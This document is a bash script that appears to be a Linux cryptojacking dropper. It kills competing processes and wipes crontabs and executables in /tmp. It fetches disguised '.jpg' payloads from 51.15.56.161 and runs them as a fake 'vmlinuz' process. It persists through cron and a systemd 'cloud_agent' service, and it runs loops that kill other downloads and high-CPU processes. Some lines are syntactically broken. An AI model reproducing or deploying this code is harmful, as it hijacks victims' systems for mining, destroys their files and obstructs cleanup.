#!/usr/bin/env bash
pkill -9 -f "\-bash"
pkill -9 -f "watchbog"
pkill -9 -f "/tmp/"
pkill -9 -f "/dev/"
pkill -9 -f "eval"
chaos=abcdefghijklmnop1234567890ABCDEFGHIJKLMNOP
entropy=344:161.65.51.15
function discord() { for i in {1..7} ; do echo -n ${chaos:RANDOM%${#chaos}:1}; done; }
new_bash=$(discord)
new_dog=$(discord)
new_killbot=$(discord)
omelette=$(discord)

eggs=('86su.jpg' '86du.jpg' '86s.jpg' '86d.jpg' '46su.jpg' '46du.jpg' '46s.jpg' '46d.jpg')

ketchup='*/5 * * * *'
pkill -18 -f [/]vmlinuz
omg=`ps aux | grep [/]vmlinuz | awk '{if($3>30.0) print 1}'`
if [ "$omg" == "1" ]; then
    ps aux | grep -v '/boot/vmlinuz' | awk '{if($3>30.0) print $2}' | while read procid; do kill -9 $procid; done
    exit
else
    pkill -9 -f [/]vmlinuz
fi
if [ $(command -v crontab | wc -l) -eq 1 ]; then
    crontab -r &> /dev/null
fi
wp=('/tmp' '/var/tmp' '/dev/shm' `pwd`)
for ip in ${wp[@]}
do
    cd $ip
    rm -rf touch myself
    cp `command -v touch` ./touch
    ./touch ./myself
    if [ ! -f ./myself ]; then
        continue
    else
        rm -rf touch myself
        break
    fi
done
sysctl -w vm.nr_hugepages=128
housewife="51.15.56.161:443}"; 

( find /var/tmp -executable -type f -exec rm -f {} \; & ) &> /dev/null
( find /tmp -executable -type f -exec rm -f {} \; & ) &> /dev/null
for egg in ${eggs[@]}
do
    rm -rf $omelette
    pkill -9 -f prot
    if [ $(command -v wget | wc -l) -eq 1 ]; then
        wget -q "http://51.15.56.161:443/$egg" -O ./$omelette
        if [[ $EUID -eq 0 ]]; then
            seasame="`command -v wget`ak -q -O /tmp/seasame http://51.15.56.161:443"
        else
            seasame="`command -v wget` -q -O /tmp/seasame http://51.15.56.161:443"
        fi
    fi
    chmod 777 ./$omelette
    nohup ./$omelette &> /dev/null
    sleep 1
    ./$omelette &> /dev/null
    sleep 3
    ps x | grep '[/]vmlinuz' &> /dev/null
    if [ $? -eq 1 ]; then
        continue
    else
        break
    fi
done
if [ ! -d $HOME ]; then
    new_home='HOME=/tmp/'
fi
if [ $(command -v crontab | wc -l) -eq 1 ]; then
    echo -e "$new_home\n$ketchup $seasame && bash /tmp/seasame" | crontab -
fi
cat << EOF > /etc/systemd/system/cloud_agent.service
[Unit]
Wants=network-online.target
After=network.target network-online.target

[Service]
Type=forking
ExecStart=`command -v bash` -c "$seasame"
TimeoutSec=0
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload &> /dev/null
        systemctl enable cloud_agent &> /dev/null
    fi
fi
echo "sleep 2;rm "'$0'" ;while true;do sleep 10; ps x | grep '[/]vmlinuz' &> /dev/null ;if [ "'$?'" -eq 1 ]; then chmod 777 ./$omelette;nohup ./$omelette &> /dev/null;./$omelette &> /dev/null;fi; ps x | grep '[/]vmlinuz' | awk '{print "'$1'"}' | awk '{if(NR>1)print}' | xargs -I{} -n1 kill -9 {} &> /dev/null;done" | tee ./$new_dog &> /dev/null

echo -n 'sleep 2;rm $0 ;while true;do sleep 5; ps aux | grep -v 'vmlinuz' | awk '{if($3>30.0) print $2}' | while read procid; do kill -9 $procid  &> /dev/null; done;done' | base64 -d | tee ./$new_killbot &> /dev/null


echo "while true; do sleep 1; pkill -f -9 'https://'; pkill -f -9 'http://'; pkill -9 -f 'eval'; done" | tee ./prot &> /dev/null
cp `command -v bash` ./$new_bash
./$new_bash ./$new_dog &
./$new_bash ./$new_killbot &
./$new_bash ./prot &
exit
